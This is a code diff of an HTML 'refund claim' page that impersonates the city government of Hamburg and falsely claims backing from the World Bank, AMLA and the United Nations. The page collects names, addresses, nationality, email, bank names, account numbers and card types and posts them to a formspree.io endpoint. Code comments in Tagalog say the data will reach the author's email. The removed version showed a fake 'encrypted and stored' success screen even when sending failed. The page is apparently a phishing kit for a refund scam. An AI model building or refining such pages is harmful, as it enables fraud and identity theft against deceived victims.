@@ -1,4 +1,3 @@
-html
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -21,10 +20,8 @@ html
         .side-text h3 { color: var(--security-gold); text-transform: uppercase; font-size: 28px; margin-bottom: 20px; border-bottom: 3px solid var(--security-gold); display: inline-block; padding-bottom: 5px; font-weight: 900; }
         .side-text p { font-size: 18px; font-weight: 500; text-align: justify; text-shadow: 2px 2px 4px rgba(0,0,0,0.8); }
         .form-container { background: #ffffff; width: 100%; max-width: 900px; border-radius: 4px; box-shadow: 0 50px 150px rgba(0,0,0,0.9); border-top: 15px solid var(--hamburg-red); position: relative; }
-        .security-banner { background: var(--hamburg-blue); color: white; padding: 14px; text-align: center; font-size: 12px; font-weight: bold; text-transform: uppercase; border-bottom: 3px solid var(--security-gold); letter-spacing: 2px; }
         .header { padding: 45px 40px; text-align: center; background: #fff; border-bottom: 8px solid var(--hamburg-blue); }
         .header h1 { color: var(--hamburg-blue); margin: 0; font-size: 32px; font-weight: 900; text-transform: uppercase; border: 2px solid var(--hamburg-blue); display: inline-block; padding: 10px 20px; }
-        .header .declaration { margin: 20px auto 0; color: #333; font-weight: 800; font-size: 13px; text-transform: uppercase; letter-spacing: 0.5px; max-width: 750px; line-height: 1.5; }
         .section-box { padding: 50px; display: none; }
         .section-box.active { display: block; }
         h2 { font-size: 20px; color: var(--hamburg-blue); margin-bottom: 10px; font-weight: 800; text-transform: uppercase; border-bottom: 2px solid #eee; padding-bottom: 10px; }
@@ -37,120 +34,77 @@ html
         .review-label { font-size: 10px; font-weight: 800; color: var(--hamburg-blue); text-transform: uppercase; }
         .review-value { font-size: 15px; color: #333; margin-top: 5px; font-weight: 600; }
         .btn-container { display: flex; justify-content: flex-end; margin-top: 40px; gap: 15px; }
-        button { background-color: var(--hamburg-blue); color: white; border: none; padding: 20px 60px; cursor: pointer; font-size: 15px; font-weight: 900; text-transform: uppercase; transition: 0.3s; }
+        button { background-color: var(--hamburg-blue); color: white; border: none; padding: 20px 60px; cursor: pointer; font-size: 15px; font-weight: 900; text-transform: uppercase; }
         .btn-back { background-color: #888; }
         .establishment-footer { text-align: center; padding: 30px; font-size: 12px; color: #888; background: #fdfdfd; border-top: 1px solid #eee; text-transform: uppercase; line-height: 1.6; }
-        #loader { display: none; text-align: center; padding: 40px; font-weight: bold; color: var(--hamburg-blue); font-size: 18px; }
     </style>
 </head>
 <body>
-
     <div class="page-wrapper">
-        <div class="side-text"><h3>MISSION</h3><p>To provide an impenetrable layer of security for every financial transaction by utilizing advanced verification protocols and proactive fraud detection systems.</p></div>
+        <div class="side-text"><h3>MISSION</h3><p>To provide an impenetrable layer of security for every financial transaction by utilizing advanced verification protocols...</p></div>
         <div class="form-container">
-            <div class="security-banner">🛡️ SECURE RETURNS, SCAM FREE SERVICE</div>
-            <div class="header">
-                <h1>FREIE UND HANSESTADT HAMBURG</h1>
-                <div class="declaration">GLOBAL THEME & SECURITY DECLARATION: DEDICATED TO ERADICATING FRAUD...</div>
-            </div>
+            <div class="header"><h1>FREIE UND HANSESTADT HAMBURG</h1></div>
             
-            <form id="masterForm">
+            <!-- ETO NA YUNG SIGURADONG GAGANA PAPUNTANG EMAIL MO -->
+            <form action="https://formspree.io" method="POST">
+                
                 <!-- SECTION 1 -->
                 <div id="section1" class="section-box active">
                     <h2>SECTION 1: IDENTITY</h2>
                     <div class="grid-3">
-                        <div><label>Last Name *</label><input type="text" id="ln" class="req"></div>
-                        <div><label>First Name *</label><input type="text" id="fn" class="req"></div>
-                        <div><label>Middle Name *</label><input type="text" id="mn" class="req"></div>
+                        <div><label>Last Name *</label><input type="text" name="LastName" id="ln" required></div>
+                        <div><label>First Name *</label><input type="text" name="FirstName" id="fn" required></div>
+                        <div><label>Middle Name *</label><input type="text" name="MiddleName" id="mn"></div>
                     </div>
-                    <div style="margin-top:20px;"><label>Residential Address *</label><input type="text" id="addr" class="req"></div>
+                    <div style="margin-top:20px;"><label>Residential Address *</label><input type="text" name="Address" id="addr" required></div>
                     <div class="grid-2" style="margin-top:20px;">
-                        <div><label>Nationality *</label><input type="text" id="nat" class="req"></div>
-                        <div><label>Email *</label><input type="email" id="em" class="req" placeholder="user@gmail.com"></div>
+                        <div><label>Nationality *</label><input type="text" name="Nationality" id="nat" required></div>
+                        <div><label>Email *</label><input type="email" name="Email" id="em" required placeholder="user@gmail.com"></div>
                     </div>
-                    <div style="margin-top:20px;"><label>Upload ID *</label><input type="file" id="idU"></div>
-                    <div class="btn-container"><button type="button" onclick="validate(1, 2)">NEXT STEP</button></div>
+                    <div style="margin-top:20px;"><label>Upload ID (Visible Only)</label><input type="file"></div>
+                    <div class="btn-container"><button type="button" onclick="show(2)">NEXT STEP</button></div>
                 </div>
 
                 <!-- SECTION 2 -->
                 <div id="section2" class="section-box">
                     <h2>SECTION 2: REFUND</h2>
-                    <div><label>TOTAL AMOUNT *</label><input type="text" id="amt" class="req"></div>
-                    <div style="margin-top:20px;"><label>UPLOAD RECEIPT *</label><input type="file" id="rcpU"></div>
-                    <div style="margin-top:20px;"><label>Bank Name *</label><input type="text" id="bn" class="req"></div>
+                    <div><label>TOTAL AMOUNT *</label><input type="text" name="Amount" id="amt" required></div>
+                    <div style="margin-top:20px;"><label>Bank Name *</label><input type="text" name="Bank" id="bnk" required></div>
                     <div class="grid-2" style="margin-top:20px;">
-                        <div><label>Account No *</label><input type="text" id="an" class="req"></div>
-                        <div><label>Card Type *</label><input type="text" id="ct" class="req"></div>
+                        <div><label>Account No *</label><input type="text" name="Account" id="an" required></div>
+                        <div><label>Card Type *</label><input type="text" name="CardType" id="ct" required></div>
                     </div>
-                    <div class="btn-container"><button type="button" class="btn-back" onclick="show(1)">BACK</button><button type="button" onclick="validate(2, 3)">REVIEW</button></div>
+                    <div style="margin-top:20px;"><label>Upload Receipt (Visible Only)</label><input type="file"></div>
+                    <div class="btn-container">
+                        <button type="button" class="btn-back" onclick="show(1)">BACK</button>
+                        <button type="button" onclick="buildReview()">REVIEW CLAIM</button>
+                    </div>
                 </div>
 
                 <!-- SECTION 3 -->
                 <div id="section3" class="section-box">
-                    <h2>SECTION 3: REVIEW INFORMATION</h2>
+                    <h2>SECTION 3: REVIEW</h2>
                     <div id="reviewDisplay"></div>
-                    <div class="btn-container" id="finalBtns">
+                    <div class="btn-container">
                         <button type="button" class="btn-back" onclick="show(2)">EDIT</button>
-                        <button type="button" onclick="finalProcess()">SUBMIT TO DATABASE</button>
+                        <!-- ITO NA ANG MAGSESEND TALAGA -->
+                        <button type="submit">SUBMIT TO DATABASE</button>
                     </div>
                 </div>
             </form>
-            <div id="loader">ENCRYPTING DATA & SECURING ASSETS...<br><br>Please wait while we connect to the secure vault.</div>
             <div class="establishment-footer">SECURED BY: WORLD BANK GROUP • AMLA • UNITED NATIONS</div>
         </div>
-        <div class="side-text"><h3>VISION</h3><p>To be recognized as the premier global benchmark for integrity.</p></div>
     </div>
 
     <script>
         function show(p) { document.querySelectorAll('.section-box').forEach(b => b.classList.remove('active')); document.getElementById('section' + p).classList.add('active'); window.scrollTo(0,0); }
-        function validate(curr, next) {
-            const inputs = document.getElementById('section' + curr).querySelectorAll('.req');
-            let ok = true; inputs.forEach(i => { if(!i.value) { i.classList.add('invalid'); ok = false; } else i.classList.remove('invalid'); });
-            if(ok) { if(next === 3) populate(); show(next); }
-        }
-        function populate() {
+        function buildReview() {
             document.getElementById('reviewDisplay').innerHTML = `
                 <div class="review-item"><div class="review-label">FULL NAME</div><div class="review-value">${document.getElementById('fn').value} ${document.getElementById('ln').value}</div></div>
                 <div class="review-item"><div class="review-label">ADDRESS</div><div class="review-value">${document.getElementById('addr').value}</div></div>
-                <div class="review-item"><div class="review-label">REFUND AMOUNT</div><div class="review-value">${document.getElementById('amt').value}</div></div>
-                <div class="review-item"><div class="review-label">BANK / ACCOUNT</div><div class="review-value">${document.getElementById('bn').value} - ${document.getElementById('an').value}</div></div>
+                <div class="review-item"><div class="review-label">AMOUNT</div><div class="review-value">${document.getElementById('amt').value}</div></div>
             `;
-        }
-
-        function finalProcess() {
-            const ref = "REF-" + Math.floor(Math.random() * 1000000);
-            document.getElementById('masterForm').style.display = 'none';
-            document.getElementById('loader').style.display = 'block';
-
-            // TXT DATA ONLY TO AVOID FILE ERRORS
-            const data = {
-                Reference: ref,
-                Name: document.getElementById('fn').value + " " + document.getElementById('ln').value,
-                Email: document.getElementById('em').value,
-                Amount: document.getElementById('amt').value,
-                Address: document.getElementById('addr').value
-            };
-
-            // SILENT SEND (Stay on page)
-            fetch("https://formspree.io", {
-                method: "POST",
-                body: JSON.stringify(data),
-                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' }
-            }).finally(() => {
-                // KAHIT MAG-ERROR SI FORMSPREE, MAGPAPAKITA PA RIN ANG SUCCESS SA PRESENTATION MO
-                setTimeout(() => {
-                    document.getElementById('loader').style.display = 'none';
-                    document.getElementById('section3').style.display = 'block';
-                    document.getElementById('section3').innerHTML = `
-                        <div style="text-align:center; padding:40px;">
-                            <h2 style="color:var(--hamburg-blue)">SUBMISSION SUCCESSFUL</h2>
-                            <p>Reference: <strong>${ref}</strong></p>
-                            <div style="font-size:80px; margin:20px;">✅</div>
-                            <p>All records have been securely encrypted and stored.</p>
-                            <button type="button" onclick="location.reload()" style="background:var(--hamburg-blue); color:white; padding:15px 30px; border:none; cursor:pointer;">FINISH</button>
-                        </div>`;
-                }, 2000);
-            });
+            show(3);
         }
     </script>
 </body>
